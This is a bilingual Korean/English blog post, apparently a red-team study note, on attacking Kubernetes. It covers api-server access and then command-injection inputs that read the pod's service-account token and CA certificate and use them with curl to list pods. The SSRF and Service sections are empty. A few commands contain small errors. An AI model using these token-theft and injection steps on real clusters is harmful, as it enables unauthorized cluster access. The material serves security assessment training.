---
title: "[K8S] Security"
# author: wrkholic84
date: 2024-02-08 00:06:00 +0900
categories: [Development, Kubernetes]
tags: [kubernetes, security]
math: true
mermaid: true
# image:
#   path: /commons/devices-mockup.png
#   width: 800
#   height: 500
#   alt: Responsive rendering of Chirpy theme on multiple devices.
---

# Kubernetes for RedTeam
Kubernetes에 대한 경험과 이해가 다르고,
보안 취약점 점검 시 관련 내용에 대한 접근이 어려운 이유로,
kubernetes 취약점 발견과 연구를 충분히 수행하기에 어려움이 있음  
이를 위해, 다음 과정을 통해 kubernetes에 대한 정리와 점검 방법에 대한 평준화를 이루고자 함

Differences in experience and understanding of Kubernetes, along with difficulties in addressing related content during security vulnerability assessments, pose challenges in adequately conducting discovery and research of Kubernetes vulnerabilities.  
To address this, the aim is to achieve a standardization of organization and inspection methods for Kubernetes through the following process.

## Prerequisite Knowledge (Introduction - What we don't know)
### 0. Abstract Concept
![00](/assets/images/posts/20221226Security/00.png)
일반적으로 Kubernets 환경에 구축된 서비스는 위 그림과 같이 apiserver와 service 두 개의 접근 경로를 가진다.  
1. Apiserver는 kubernetes 환경 전체를 제어
2. Service(kuberntes resource)는 웹서비스를 인터넷과 연결해주는 역할

Typically, Application deployed in a Kubernetes environment have two access points, as shown in the figure above: the api-server and the service.

1. Api-server controls the entire Kubernetes environment.
2. Service (a Kubernetes resource) connects the web service to the internet as NodePort or LoadBalancer.

### 1. Api-server
apiserver는 kubernetes 자체라고 봐도 무방함.  
api를 호출하는 방식으로 kubernetes 전체 환경을 제어할 수 있음. api 호출은 authn > authz > Admission Control 3단계에 걸쳐 진행.
#### 1.1. How to access api-server
##### 1.1.1. User Certificate
사용자 인증서와 키로 apiserver를 호출 할 수 있음
```bash
ubuntu@mypc:~$ curl -k --cert ./user.crt --key ./user.key https:/kubernetes:6443/api
{
  "kind": "APIVersions",
  "versions": [
    "v1"
  ],
  "serverAddressByClientCIDRs": [
    {
      "clientCIDR": "0.0.0.0/0",
      "serverAddress": "x.x.x.x:6443"
    }
  ]
}
```
사용자 인증서와 키는 base64로 인코딩되어 있을 수도 있음
```bash
ubuntu@mypc:~$ cat ./user.crt | base64 | tr -d "\n" 
LS0tLS1C...
ubuntu@mypc:~$ cat "LS0tLS1C..." | base64 -d
-----BEGIN CERTIFICATE-----
MIIDTzCCAjegAwIBAgIQYPmmYnZ...
-----END CERTIFICATE-----
```
##### 1.1.2. Service Account
SA > export bearer > Kubectl


## What can we do?
### Command Injection
#### get Kubernetes Information from env
```bash
Command Injection : env | grep -i kubernetes
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
KUBERNETES_PORT_443_TCP_PROTO=tcp
```
#### get Kubernetes Information from nslookup
```bash
Command Injection : nslookup kubernetes.default.svc
Server:		10.96.0.10
Address:	10.96.0.10#53

Name:	kubernetes.default.svc.cluster.local
Address: 10.96.0.1
```
#### get Kubernetes Information from ServiceAccount
```bash
Command Injection : cat /var/run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUz ...
Command Injection : cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
hack8s
Command Injection : cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-----BEGIN CERTIFICATE-----
MIIDB ...
```
#### 따라해보기
```bash
Command Injection : cat /var/run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI...
Command Injection : curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt --header "Authorization: Bearer eyJhbGciOiJSUzI..." -X GET https://kubernetes:6443/api/v1/namespaces/hack8s/pods
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "266526"
  },
  "items": [
    {
      "metadata": {
        "name": "busybox",
        ...
      }
    }
  ]
}
```
#### 위에서 얻은 정보를 조합하여 api 호출 가능
```bash
Command Injection : curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api
```

### SSRF
### 3. Service




